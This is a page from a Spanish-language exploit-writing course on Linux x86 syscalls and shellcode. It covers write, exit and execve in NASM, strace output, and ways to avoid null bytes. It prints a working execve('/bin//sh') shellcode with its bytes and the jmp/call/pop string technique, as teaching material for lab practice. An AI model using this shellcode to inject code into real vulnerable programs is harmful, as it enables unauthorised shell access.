<!DOCTYPE html>
<html lang="en-us">

  <head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title>
    
       &middot; Guía de exploits
    
  </title>

  <!-- CSS -->

  <link rel="stylesheet" href="/public/css/poole.css">
  <link rel="stylesheet" href="/public/css/syntax.css">
  <link rel="stylesheet" href="/public/css/hyde.css">
  <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">

  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/guia-escritura-exploits/public/apple-touch-icon-144-precomposed.png">
                                 <link rel="shortcut icon" href="/guia-escritura-exploits/public/favicon.ico">

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
</head>


  <body>

    <div class="sidebar">
 <!-- <div class="container sidebar-sticky">-->
  <div class="container sidebar">
    <div class="sidebar-about">
      <h1>
        <a href="/guia-escritura-exploits/">
          Guía de exploits
        </a>
      </h1>
      <!--<p class="lead"></p>-->
    </div>

    <nav class="sidebar-nav">

     <!-- <a class="sidebar-nav-item" href="/guia-escritura-exploits/">Home</a>-->

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/buffer-overflow/index.html">Buffer Overflow</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/1-introduccion.html">Nivel 1 | Teoría</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/1-practica.html">Nivel 1 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/2-shellcode.html">Nivel 2 | Shellcode</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/2-practica.html">Nivel 2 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/3-got.html">Nivel 3 | GOT</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/3-practica.html">Nivel 3 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/4-practica.html">Nivel 4 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/format-string/index.html">Format String</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/format-string/5-format-string.html">Nivel 5 | Format strings</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/format-string/5-practica.html">Nivel 5 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/esoteric/index.html">Esoteric</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/esoteric/6-ret2libc.html">Nivel 6 | Return to libc</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/esoteric/6-practica.html">Nivel 6 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/configuracion.html">Configuración</a>
        <a class="sidebar-nav-item" href="/guia-escritura-exploits/herramientas.html">Herramientas</a>


      <!--<a class="sidebar-nav-item" href="/archive/v2.1.0.zip">Descargar PDF</a>-->
      <a class="sidebar-nav-item" href="https://github.com/fundacion-sadosky/guia-escritura-exploits">Proyecto en GitHub</a>
    </nav>

    <p class="sidebar-nav-item footer">Basado en los <a href="https://github.com/gerasdf/InsecureProgramming/">abos de Gera</a></br> Teresa Alberto | STIC, Fundación Sadosky  </br> <a href="https://github.com/fundacion-sadosky/guia-escritura-exploits/blob/master/LICENSE">BY-NC-SA</a> | 2018</p>
  </div>
</div>


    <div class="content container">
      <div class="page">
  <!--<h1 class="page-title"></h1>-->
  <h1 id="shellcode--syscalls">Shellcode &amp; syscalls</h1>
<p>En esta instancia el objetivo será aprovecharse de una vulnerabilidad de un programa para ejecutar código malicioso que no está en el binario original. En otras palabras, lo que se busca ejecutar es un shellcode.</p>

<p>Un shellcode es un código que se inyecta en la memoria de un programa vulnerable bajo la forma de un string de bytes.   <br />
El nombre <em>shellcode</em> se refería históricamente a inyectar un programa shell que permite ejecutar cualquier otro comando, no obstante hoy el término se usa de manera general para hablar de la inyección de código malicioso. Es posible programar un shellcode para que haga cualquier cosa que se nos ocurra dado que en última instancia es en sí mismo un programa.</p>

<p>Un programa en C que utiliza funciones como <code class="highlighter-rouge">printf()</code> o <code class="highlighter-rouge">write()</code> de la biblioteca <code class="highlighter-rouge">libc</code>, usa esta biblioteca para realizar llamadas al sistema operativo que es el encargado de manejar cuestiones como la escritura, lectura y ejecución de programas. 
Hay que tener en cuenta que el shellcode no se va a cargar en memoria por el sistema operativo, sino que directamente es copiado a la memoria del programa vulnerable como una cadena de caracteres, aprovechando funciones como <code class="highlighter-rouge">strcpy()</code> y <code class="highlighter-rouge">gets()</code>.</p>

<p>Es por ello que, si nuestro shellcode utiliza una función como <code class="highlighter-rouge">write()</code> (lo más probable es que necesitemos que lo haga) esas llamadas al sistema operativo deben ser manejadas directamente. Es necesario entonces comprender el funcionamiento de las llamadas al sistema antes de continuar con la creación de un shellcode en sí mismo.</p>

<h2 id="llamadas-al-sistema">Llamadas al sistema</h2>
<p>A la hora de planear estrategias de ataque se usarán frecuentemente llamadas al sistema.    <br />
Los programas que corren en el espacio de usuario cuando requieren interactuar con el sistema operativo deben realizar <em>llamadas al sistema</em> para que el sistema operativo realice las operaciones en su nombre.
La manera en que se hace esta llamada es diferente para cada arquitectura, en el caso de x86 los programas de usuario pueden hacer una llamada al sistema con una interrupción por software con la instrucción <code class="highlighter-rouge">int 0x80</code>.</p>

<p>En Linux cada llamada toma sus argumentos de los registros según el siguiente criterio:</p>
<div class="language-nasm highlighter-rouge"><pre class="codehilite"><code><span class="n">eax</span> <span class="o">=&gt;</span> <span class="n">nro</span> <span class="n">de</span> <span class="k">syscall</span>
<span class="n">ebx</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="n">er</span> <span class="n">argumento</span>
<span class="n">ecx</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="kt">do</span> <span class="n">argumento</span>
<span class="n">edx</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="n">er</span> <span class="n">argumento</span> 
</code></pre></div>
<p>Para saber el número que corresponde a cada syscall se puede consultar: <code class="highlighter-rouge">/usr/include/asm/unistd_32.h</code>.   <br />
Según la syscall en cuestión será necesario definir también los valores de otros registros.</p>

<p>Con <code class="highlighter-rouge">strace</code> es posible rastrear las llamadas a sistema que suceden cuando tenemos un programa en C tan simple como:</p>
<div class="language-c highlighter-rouge"><pre class="codehilite"><code><span class="n">test</span><span class="o">-</span><span class="n">syscalls</span><span class="p">.</span><span class="n">c</span>

    <span class="cp">#include &lt;stdio.h&gt;
</span>    <span class="kt">int</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
    	<span class="n">printf</span><span class="p">(</span><span class="s">"Hola mundo!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div>

<div class="language-shell_session highlighter-rouge"><pre class="codehilite"><code>    user@abos:~$ gcc -m32 -no-pie -o test-syscalls test-syscalls.c
    user@abos:~$ strace ./test-syscalls
    execve("./llamada-sistema", ["./llamada-sistema"], [/* 18 vars */]) = 0
    brk(0)                                  = 0x804a000
    ....
    fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 2), ...}) = 0
    mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fd8000
    
 =&gt; write(1, "Hola mundo!\n", 12)           = 12

    exit_group(0)                           = ?
    +++ exited with 0 +++
</code></pre></div>
<p>De este modo es posible rastrear la llamada al systema <code class="highlighter-rouge">write</code> que es la encargada de efectivamente imprimir el string.</p>

<h3 id="syscall-write">Syscall write:</h3>
<p>Para imprimir por salida estándar (<code class="highlighter-rouge">stdout</code>) es necesaria la syscall <code class="highlighter-rouge">write</code>.</p>
<div class="language-shell_session highlighter-rouge"><pre class="codehilite"><code> $ man 2 write          ; documentación de syscalls

 WRITE(2)
 SYNOPSIS
     #include &lt;unistd.h&gt;
     ssize_t write(int fd, const void *buf, size_t count);
</code></pre></div>
<p>Con los registros seteados de la siguiente manera:</p>
<div class="language-nasm highlighter-rouge"><pre class="codehilite"><code><span class="n">eax</span> <span class="o">=&gt;</span> <span class="n">nro</span> <span class="mi">4</span> <span class="k">syscall</span> <span class="n">write</span>
<span class="n">ebx</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="n">er</span> <span class="n">argumento</span><span class="o">:</span> <span class="n">fd</span> <span class="n">o</span> <span class="n">file</span> <span class="n">descriptor</span><span class="p">.</span> <span class="n">Es</span> <span class="mi">1</span> <span class="n">para</span> <span class="n">stdout</span><span class="p">.</span>
<span class="n">ecx</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="kt">do</span> <span class="n">argumento</span><span class="o">:</span> <span class="o">*</span><span class="n">buf</span> <span class="n">o</span> <span class="n">mensaje</span> <span class="n">a</span> <span class="n">imprimir</span><span class="p">.</span>
<span class="n">edx</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="n">er</span> <span class="n">argumento</span><span class="o">:</span> <span class="n">count</span> <span class="n">o</span> <span class="n">longitud</span> <span class="n">del</span> <span class="n">mensaje</span><span class="p">.</span>  
</code></pre></div>

<p>Ejemplo de una syscall <code class="highlighter-rouge">write</code> en assembler:</p>
<div class="language-nasm highlighter-rouge"><pre class="codehilite"><code><span class="kr">section</span> <span class="p">.</span><span class="n">data</span>                  <span class="c">; segmento DATA</span>
  <span class="n">mensaje</span> <span class="kt">db</span> <span class="s">"Hola mundo"</span><span class="p">,</span> <span class="mh">0x0a</span>

<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>                  <span class="c">; segmento TEXT</span>
  <span class="kr">global</span> <span class="n">_start</span>                <span class="c">; punto de entrada del ELF</span>

  <span class="n">_start</span><span class="o">:</span>

  <span class="c">; syscall write(1, mensaje, 11)</span>
    <span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">4</span>                 <span class="c">; 4 = write, nro syscall</span>
    <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="mi">1</span>                 <span class="c">; 1 = stdout, filedescriptor</span>
    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">mensaje</span>           <span class="c">; mensaje en ecx </span>
    <span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="mi">11</span>                <span class="c">; longitud del mensaje (Hola mundo\n)</span>
    <span class="k">int</span> <span class="mh">0x80</span>                   <span class="c">; interrupcion de llamado al sistema</span>
</code></pre></div>

<h3 id="syscall-exit">Syscall exit:</h3>
<p>Para finalizar un proceso se usa el syscall exit:</p>
<div class="language-shell_session highlighter-rouge"><pre class="codehilite"><code> $ man 2 exit

 EXIT(2)
 SYNOPSIS
       #include &lt;unistd.h&gt;
       void _exit(int status);
</code></pre></div>
<p>Los registros deben estar seteados de la siguiente manera:</p>
<div class="language-nasm highlighter-rouge"><pre class="codehilite"><code><span class="n">eax</span> <span class="o">=&gt;</span> <span class="n">nro</span> <span class="mi">1</span> <span class="k">syscall</span> <span class="n">exit</span>
<span class="n">ebx</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="n">er</span> <span class="n">argumento</span><span class="o">:</span> <span class="n">status</span><span class="p">.</span>   
</code></pre></div>
<p>Si quisieramos ejecutar <code class="highlighter-rouge">exit(0)</code>, el código assembler necesario sería:</p>
<div class="language-nasm highlighter-rouge"><pre class="codehilite"><code><span class="kr">section</span> <span class="p">.</span><span class="n">text</span>                  <span class="c">; segmento TEXT</span>
  <span class="kr">global</span> <span class="n">_start</span>                  <span class="c">; punto de entrada del ELF</span>

  <span class="n">_start</span><span class="o">:</span>

  <span class="c">; syscall exit(0)</span>
    <span class="k">xor</span>    <span class="n">ebx</span><span class="p">,</span><span class="n">ebx</span>              <span class="c">; ebx = 0, status code</span>
    <span class="k">xor</span>    <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
    <span class="k">mov</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0x1</span>               <span class="c">; 1 = exit, nro syscall</span>
    <span class="k">int</span>    <span class="mh">0x80</span>
</code></pre></div>

<h3 id="syscall-execve">Syscall execve:</h3>
<p>Para ejecutar un programa se usa el syscall execve, que corresponde al syscall 11.</p>
<div class="language-shell_session highlighter-rouge"><pre class="codehilite"><code> $ man 2 execve

 EXECVE(2)
 SYNOPSIS
     #include &lt;unistd.h&gt;
     int execve(const char *filename, char *const argv[], char *const envp[]);
</code></pre></div>
<p>Para ejecutar <code class="highlighter-rouge">execve</code> los registros deben estar seteados de la siguiente manera:</p>
<div class="language-nasm highlighter-rouge"><pre class="codehilite"><code><span class="n">eax</span> <span class="o">=&gt;</span> <span class="n">nro</span> <span class="mi">11</span> <span class="k">syscall</span> <span class="n">execve</span>
<span class="n">ebx</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="n">er</span> <span class="n">argumento</span><span class="o">:</span> <span class="n">filename</span><span class="p">,</span> <span class="n">un</span> <span class="n">puntero</span> <span class="n">al</span> <span class="n">nombre</span> <span class="n">del</span> <span class="n">binario</span> <span class="n">a</span> <span class="n">ejecutar</span><span class="p">.</span> 
<span class="n">ecx</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="kt">do</span> <span class="n">argumento</span><span class="o">:</span> <span class="n">argv</span><span class="p">[],</span> <span class="n">un</span> <span class="n">puntero</span> <span class="n">a</span> <span class="n">un</span> <span class="n">array</span> <span class="n">de</span> <span class="n">argumentos</span> <span class="p">(</span><span class="n">comenzando</span> <span class="k">por</span> <span class="n">el</span> <span class="n">nombre</span> <span class="n">del</span> <span class="n">binario</span> <span class="n">y</span> <span class="n">finalizando</span> <span class="n">con</span> <span class="n">un</span> <span class="n">caracter</span> <span class="n">nulo</span><span class="p">).</span>
<span class="n">edx</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="n">er</span> <span class="n">argumento</span><span class="o">:</span> <span class="n">envp</span><span class="p">[],</span> <span class="n">un</span> <span class="n">puntero</span> <span class="n">a</span> <span class="n">un</span> <span class="n">array</span> <span class="n">de</span> <span class="n">variables</span> <span class="n">de</span> <span class="n">entorno</span><span class="p">,</span> <span class="n">que</span> <span class="n">tambi</span><span class="err">é</span><span class="n">n</span> <span class="n">finaliza</span> <span class="n">en</span> <span class="n">un</span> <span class="n">caracter</span> <span class="n">nulo</span><span class="p">.</span>  
</code></pre></div>
<p>Para simplificar el código en assembler, buscamos ejecutar <code class="highlighter-rouge">execve("/bin/sh", NULL, NULL)</code> (con <code class="highlighter-rouge">argv[]</code> y <code class="highlighter-rouge">envp[]</code> en <code class="highlighter-rouge">NULL</code>). Para ello los registros deben estar seteados de la siguiente manera:</p>
<div class="language-nasm highlighter-rouge"><pre class="codehilite"><code><span class="n">eax</span> <span class="o">=&gt;</span> <span class="n">nro</span> <span class="mi">11</span> <span class="k">syscall</span> <span class="n">execve</span>
<span class="n">ebx</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="n">er</span> <span class="n">argumento</span><span class="o">:</span> <span class="n">puntero</span> <span class="n">al</span> <span class="n">string</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="p">.</span>
<span class="n">ecx</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="kt">do</span> <span class="n">argumento</span><span class="o">:</span> <span class="n">NULL</span>
<span class="n">edx</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="n">er</span> <span class="n">argumento</span><span class="o">:</span> <span class="n">NULL</span>
</code></pre></div>
<p>Y el código en assembler sería:</p>
<div class="language-nasm highlighter-rouge"><pre class="codehilite"><code> <span class="mi">31</span> <span class="n">c0</span>            <span class="k">xor</span>    <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
 <span class="mi">50</span>               <span class="k">push</span>   <span class="n">eax</span>           <span class="c">; \0</span>
 <span class="mi">68</span> <span class="mi">2</span><span class="n">f</span> <span class="mi">2</span><span class="n">f</span> <span class="mi">73</span> <span class="mi">68</span>   <span class="k">push</span>   <span class="mh">0x68732f2f</span>    <span class="c">; hs// en ASCII (little endian de //sh)</span>
 <span class="mi">68</span> <span class="mi">2</span><span class="n">f</span> <span class="mi">62</span> <span class="mi">69</span> <span class="mi">6</span><span class="n">e</span>   <span class="k">push</span>   <span class="mh">0x6e69622f</span>    <span class="c">; nib/ en ASCII (little endian de /bin)</span>
 <span class="mi">89</span> <span class="n">e3</span>            <span class="k">mov</span>    <span class="n">ebx</span><span class="p">,</span> <span class="n">esp</span>      <span class="c">; ebx =&gt; /bin//sh\0</span>
 <span class="mi">89</span> <span class="n">c1</span>            <span class="k">mov</span>    <span class="n">ecx</span><span class="p">,</span> <span class="n">eax</span>      <span class="c">; ecx = 0x0</span>
 <span class="mi">89</span> <span class="n">c2</span>            <span class="k">mov</span>    <span class="n">edx</span><span class="p">,</span> <span class="n">eax</span>      <span class="c">; edx = 0x0</span>
 <span class="n">b0</span> <span class="mi">0</span><span class="n">b</span>            <span class="k">mov</span>    <span class="n">al</span><span class="p">,</span> <span class="mh">0x0b</span>      <span class="c">; 11 = execve, nro syscall</span>
 <span class="n">cd</span> <span class="mi">80</span>            <span class="k">int</span>    <span class="mh">0x80</span>
</code></pre></div>
<p>Ejemplo tomado de <a href="http://shell-storm.org/shellcode/files/shellcode-811.php">Shell storm</a>.</p>

<blockquote>
  <p><strong>Consideraciones</strong>: el uso de una doble barra de <code class="highlighter-rouge">/bin//sh</code> es por el problema de la escritura de caracteres nulos en el shellcode. La barra extra permite alinear el string <code class="highlighter-rouge">/bin//sh</code> en dos <a href="./imagenes/stack1/tipo-dato.png">double-words</a> (de 4 bytes cada una), quedando el <code class="highlighter-rouge">\0</code> final en la siguiente word o <em>palabra</em>. Este alineamiento permite generar ese <code class="highlighter-rouge">\0</code> final con un <code class="highlighter-rouge">xor</code>, sin tener el problema de la escritura de caracteres nulos. Si en cambio se elimina la doble barra, el <code class="highlighter-rouge">\0</code> formaría parte de la segunda double-word y con un <code class="highlighter-rouge">xor</code> no lograríamos incluirlo en el string y un mecanismo más complejo sería necesario. La cuestión de los caracteres especiales en el shellcode se desarrolla más adelante.</p>
</blockquote>

<h3 id="ensamblar-y-linkear">Ensamblar y linkear</h3>
<p>Cuando compilamos un programa en C, <a href="../herramientas.md#gcc"><code class="highlighter-rouge">gcc</code></a> se ocupa de ensamblar el programa y linkearlo para lograr el archivo ELF ejecutable. De manera similar cuando partimos de un programa en assembler y queremos obtener un archivo ELF ejecutable podemos ensamblar el programa con <code class="highlighter-rouge">nasm -f ELF</code> y linkearlo con <code class="highlighter-rouge">ld</code>.   <br />
Para indicarle al linker dónde comienzan las instrucciones en assembler se agrega la línea <code class="highlighter-rouge">global _start</code>.</p>

<p>Creamos un programa <code class="highlighter-rouge">holaMundo.asm</code> en assembler con las llamadas <code class="highlighter-rouge">write()</code> y <code class="highlighter-rouge">exit()</code>:</p>
<div class="language-nasm highlighter-rouge"><pre class="codehilite"><code><span class="kr">section</span> <span class="p">.</span><span class="n">data</span>                  <span class="c">; segmento DATA</span>
<span class="n">mensaje</span> <span class="kt">db</span> <span class="s">"Hola mundo"</span><span class="p">,</span> <span class="mh">0x0a</span>

<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>                  <span class="c">; segmento TEXT</span>
<span class="kr">global</span> <span class="n">_start</span>                  <span class="c">; punto de entrada del ELF</span>

<span class="n">_start</span><span class="o">:</span>

<span class="c">;syscall write(1, mensaje, 11)</span>
        <span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">4</span>                 <span class="c">; syscall write: #4</span>
        <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="mi">1</span>                 <span class="c">; stdout filedescriptor: #1</span>
        <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">mensaje</span>           <span class="c">; mensaje en ecx</span>
        <span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="mi">11</span>                <span class="c">; longitud del mensaje (Hola mundo\n)</span>
        <span class="k">int</span> <span class="mh">0x80</span>                   <span class="c">; interrupcion</span>

<span class="c">;syscall exit(0)</span>
        <span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">1</span>
        <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="mi">0</span>
        <span class="k">int</span> <span class="mh">0x80</span>
</code></pre></div>
<blockquote>
  <p><strong>Consideraciones</strong>: es importante tener en mente que el string se almacenó en la sección .data. En el siguiente apartado se retomará este punto y se explicará pórque no es posible conducirse de ese modo y se planteará una estrategia alternativa.</p>
</blockquote>

<p>Lo ensamblamos:</p>
<div class="language-shell_session highlighter-rouge"><pre class="codehilite"><code><span class="w">user@abos:~$ </span><span class="nc">nasm</span><span class="kv"> -f elf holaMundo.asm
</span></code></pre></div>
<p><code class="highlighter-rouge">nasm</code> con el argumento <code class="highlighter-rouge">-f elf</code> ensambla el programa en un archivo objeto preparado para ser linkeado como un binario ELF. Como resultado genera el archivo objeto <code class="highlighter-rouge">holaMundo.o</code>.   <br />
Linkeamos ese archivo objeto:</p>
<div class="language-shell_session highlighter-rouge"><pre class="codehilite"><code><span class="w">user@abos:~$ </span><span class="nc">ld</span><span class="kv"> -o holaMundo holaMundo.o
</span></code></pre></div>
<p><code class="highlighter-rouge">ld</code> va a crear un binario ELF a partir del archivo objeto.   <br />
Ejecutamos y vemos la salida estándar y la finalización del programa:</p>
<div class="language-shell_session highlighter-rouge"><pre class="codehilite"><code><span class="w">user@abos:~$ </span><span class="nc">./holaMundo</span><span class="kv">
</span>Hola mundo
</code></pre></div>

<h2 id="shellcode">Shellcode</h2>
<p>Cuando se trata de un exploit que incluye un shellcode existen 3 instancias importantes: la programación del shellcode, su inyección en memoria como string de bytes y lograr su ejecución.</p>

<p>El shellcode no es un programa ejecutable como cualquier otro, sus instrucciones deben ser autocontenidas para lograr su ejecución por parte del procesador sin importar el estado actual del programa vulnerable. El shellcode no va a ser linkeado ni va a ser cargado en memoria como un proceso por el sistema operativo. Es por ello que los ejemplos de llamadas al sistema deben ser retocados para cumplir ciertos criterios:</p>
<ol>
  <li><strong>No disponemos del segmento data</strong>: no es posible utilizar el segmento de datos en el código assembler del shellcode como se hizo con “Hola mundo” en el ejemplo anterior <code class="highlighter-rouge">holaMundo.asm</code>. El shellcode no se ejecutará como un programa corriente ni sus segmentos serán cargados en memoria por el sistema operativo. Es por ello que veremos maneras de manipular un string sin recurrir a la sección .data.</li>
  <li><strong>Evitar caracteres especiales</strong>: el shellcode no debe tener caracteres especiales como <code class="highlighter-rouge">\x00</code> entre sus bytes porque se copia en memoria con funciones que manipulan strings como <code class="highlighter-rouge">strcpy()</code>. Usarlos provocaría que el shellcode quede truncado. (Es posible por prueba y error detectar qué caracter finaliza el copiado del shellcode en memoria, según la función vulnerable de la que se trate).</li>
  <li><strong>Mínima longitud</strong>: el shellcode debe tener la mínima longitud posible porque en la mayoría de los casos no contamos con demasiado espacio en el búfer para almacenarlo.</li>
</ol>

<h3 id="programar-un-shellcode">Programar un shellcode</h3>
<p>Es recomendable comenzar programando unx mismx los shellcodes más sencillos para comprender su funcionamiento y acercarse a la potencia de crear shellcodes ad-hoc. No obstante existen repositorios de shellcodes a disposición en <a href="http://shell-storm.org/shellcode/">Shell storm</a> o <a href="https://www.exploit-db.com/shellcode/">exploit-db</a>. Es importante manipular estos binarios con extrema precaución, por ejemplo trabajando con un entorno virtualizado como buena práctica.</p>

<h4 id="estrategias-para-crear-un-shellcode-inyectable-dentro-de-un-programa-vulnerable">Estrategias para crear un shellcode inyectable dentro de un programa vulnerable:</h4>
<p>Suponiendo que queremos con nuestro shellcode imprimir un mensaje por salida estándar, similar al siguiente programa en C:</p>

<div class="language-c highlighter-rouge"><pre class="codehilite"><code><span class="cp">#include &lt;unistd.h&gt;
</span> 
<span class="kt">int</span> <span class="n">main</span><span class="p">(){</span>
	<span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="err">“</span><span class="n">you</span> <span class="n">win</span><span class="o">!</span><span class="err">”</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>Seguimos la directivas indicadas anteriormente.</p>

<ol>
  <li>
    <p><strong>No disponemos del segmento data</strong>: el string “you win” debe ser almacenado en la pila directamente para evitar el uso del segmento de datos. Al hacerlo de esa manera necesitamos un puntero al string para pasarle como argumento a <code class="highlighter-rouge">write()</code> y lograr que se imprima ese mensaje, ya que no conocemos de antemano su dirección exacta.</p>

    <p>Para contar con la dirección del string podemos aprovechar que la instrucción <code class="highlighter-rouge">call</code> en assembler se encarga de almacenar en la pila la dirección que sigue al <code class="highlighter-rouge">call</code> antes de hacer el salto a la función llamada y de esta manera poder retornar una vez finalizada su ejecución. Agregamos un <code class="highlighter-rouge">call</code> ad-hoc seguido del string que sólo sirva para almacenar su dirección en un lugar conocido de la pila.</p>

    <p><code class="highlighter-rouge">shellcode.asm</code></p>

    <p>```nasm
      section .text
        global _start</p>

    <div class="highlighter-rouge"><pre class="codehilite"><code>   _start:  +---&lt;   jmp short dummy        ; 1. salto a un dummy con el call  |   |  -&gt; imprimir_str:            ; 3. syscall write()  |  |    pop ecx                  ; desapilo la dirección del string en ecx  |  |  ....  |  |  |  |   +-&gt;|  dummy:                   
+--&lt; call imprimir_str      ; 2. llamo al código encargado de imprimir el mensaje
     db 'you win!A'         ; antes de saltar apila dirección de "you win!A"
                            ; para retornar luego del call  ```
</code></pre>    </div>

    <p>Una vez almacenada la dirección del string, con la instrucción <code class="highlighter-rouge">pop</code> lo almacenamos en un registro para su uso posterior.</p>
  </li>
  <li>
    <p><strong>Evitar caracteres especiales</strong>: se usan ciertos trucos para que al compilar el código binario no tenga caracteres nulos.</p>
    <ul>
      <li>En las llamadas a sistema es frecuente tener que poner en cero un registro (por ejemplo para el status del syscall <code class="highlighter-rouge">exit</code>). Si en vez de copiar un cero usamos un OR exclusivo (un XOR de un valor con sí mismo siempre da cero) logramos el objetivo sin valores nulos en el código máquina.
        <div class="language-nasm highlighter-rouge"><pre class="codehilite"><code><span class="n">instrucci</span><span class="err">ó</span><span class="n">n</span>      <span class="o">|</span> <span class="n">c</span><span class="err">ó</span><span class="n">digo</span> <span class="n">m</span><span class="err">á</span><span class="n">quina</span>
<span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span>         <span class="err">\</span><span class="n">xb8</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span>     <span class="c">; eax = 0. Pero con valores nulos en código máquina.</span>
<span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>       <span class="err">\</span><span class="n">x31</span><span class="err">\</span><span class="n">xc0</span>                 <span class="c">; eax = 0. Sin valores nulos.</span>
</code></pre>        </div>
      </li>
      <li>Cuando una instrucción manipula un registro de 32 bits (como <code class="highlighter-rouge">eax</code>) y el otro de sus operandos ocupa menos bits (por ejemplo un entero como el número 2) se completa con ceros, es decir 2 pasa a ser <code class="highlighter-rouge">0000 0002</code> y almacenado bajo el formato little endian <code class="highlighter-rouge">\x02\x00\x00\x00</code> como se puede ver en el código máquina de abajo. Para evitar los caracteres nulos finales es posible usar únicamente las <a href="./imagenes/partes-registro.png">partes del registro</a> necesarias para la operación (por ejemplo, con <code class="highlighter-rouge">al</code> se manipulan sólo los 8 bits menos significativos del registro).
        <div class="language-nasm highlighter-rouge"><pre class="codehilite"><code><span class="n">instrucci</span><span class="err">ó</span><span class="n">n</span>      <span class="o">|</span> <span class="n">c</span><span class="err">ó</span><span class="n">digo</span> <span class="n">m</span><span class="err">á</span><span class="n">quina</span>
<span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">2</span>         <span class="err">\</span><span class="n">xb8</span><span class="err">\</span><span class="n">x02</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span>     <span class="c">; eax = 00 00 00 02</span>
<span class="k">mov</span> <span class="n">ax</span><span class="p">,</span> <span class="mi">2</span>          <span class="err">\</span><span class="n">x66</span><span class="err">\</span><span class="n">xb0</span><span class="err">\</span><span class="n">x02</span><span class="err">\</span><span class="n">x00</span>         <span class="c">; eax = ?? ?? 00 02</span>
<span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mi">2</span>          <span class="err">\</span><span class="n">xb0</span><span class="err">\</span><span class="n">x02</span>                 <span class="c">; eax = ?? ?? ?? 02. Sin caracteres nulos en cód. maquina</span>
</code></pre>        </div>
        <p>Al hacer esto, el resto de los bits de <code class="highlighter-rouge">eax</code> tienen datos desconocidos, lo que puede provocar un funcionamiento inesperado. Por eso es importante antes de estas operaciones poner en 0 el registro.
 <code class="highlighter-rouge">nasm
 instrucción      | código máquina
 xor eax, eax       \x31\xc0                 ; eax = 00 00 00 00
 mov al, 2          \xb0\x02                 ; eax = 00 00 00 02
</code>
 Finalmente, logramos un código máquina resultante <code class="highlighter-rouge">\x31\xc0\xb0\x02</code> que no tiene caracteres nulos.</p>
      </li>
